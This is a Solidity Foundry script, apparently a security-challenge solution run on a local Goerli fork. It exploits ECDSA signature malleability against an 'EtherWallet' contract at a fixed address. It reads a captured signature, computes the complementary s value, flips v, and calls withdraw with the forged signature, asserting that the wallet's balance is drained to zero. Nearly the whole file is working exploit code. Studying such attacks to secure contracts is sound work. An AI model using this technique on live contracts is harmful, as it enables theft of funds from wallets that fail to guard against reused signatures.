// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

/*
 * 1. first start anvil and fork goerli:
 * anvil --fork-url $RPC_GOERLI --fork-block-number 7475421
 * 2. Then run the script with one of the private keys given to you by Anvil:
 * forge script script/exploits/ExploitEtherWallet.sol:ExploitEtherWallet --fork-url http://localhost:8545 /
 * --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 --broadcast -vvvvv
 */
contract ExploitEtherWallet is Script, Test {
    function run() public {
        vm.startBroadcast();

        // etherwallet
        address etherwallet = address(
            0x4b90946aB87BF6e1CA1F26b2af2897445F48f877
        );

        bytes32 r;
        bytes32 s;
        uint8 v;

        bytes32 sNew;
        uint8 vNew;

        (r, s, v) = _getSignature(
            hex"53e2bbed453425461021f7fa980d928ed1cb0047ad0b0b99551706e426313f293ba5b06947c91fc3738a7e63159b43148ecc8f8070b37869b95e96261fc9657d1c"
        );
        emit log_bytes32(r);
        emit log_bytes32(s);
        console.log(v);

        if (v == 27) {
            bytes32 n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;
            sNew = bytes32(uint256(n) - uint256(s));

            // set v to 28 since we now use s in the upper half
            vNew = 28;
        } else {
            bytes32 n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;
            sNew = bytes32(uint256(n) - uint256(s));

            // set v to 27 since we now use s in the lower half
            vNew = 27;
        }

        // exploit
        bytes memory newSignature = abi.encodePacked(r, sNew, vNew);
        (bool success, bytes memory ret) = address(etherwallet).call(
            abi.encodeWithSignature("withdraw(bytes)", newSignature)
        );

        if (!success) {
            string memory decoded_ret = _getRevertMsg(ret);
            console.log(decoded_ret);
        }

        // make sure all ether got withdrawn
        assertEq(address(etherwallet).balance, 0);

        vm.stopBroadcast();
    }

    function _getSignature(bytes memory signature)
        internal
        pure
        returns (
            bytes32,
            bytes32,
            uint8
        )
    {
        bytes32 r;
        bytes32 s;
        uint8 v;
        // ecrecover takes the signature parameters, and the only way to get them
        // currently is to use assembly.
        /// @solidity memory-safe-assembly
        assembly {
            r := mload(add(signature, 0x20))
            s := mload(add(signature, 0x40))
            v := byte(0, mload(add(signature, 0x60)))
        }
        return (r, s, v);
    }

    function _getRevertMsg(bytes memory _returnData)
        internal
        pure
        returns (string memory)
    {
        // If the _res length is less than 68, then the transaction failed silently (without a revert message)
        if (_returnData.length < 68)
            return "Transaction reverted silently / No error";

        assembly {
            // Slice the sighash.
            _returnData := add(_returnData, 0x04)
        }
        return abi.decode(_returnData, (string)); // All that remains is the revert string
    }
}
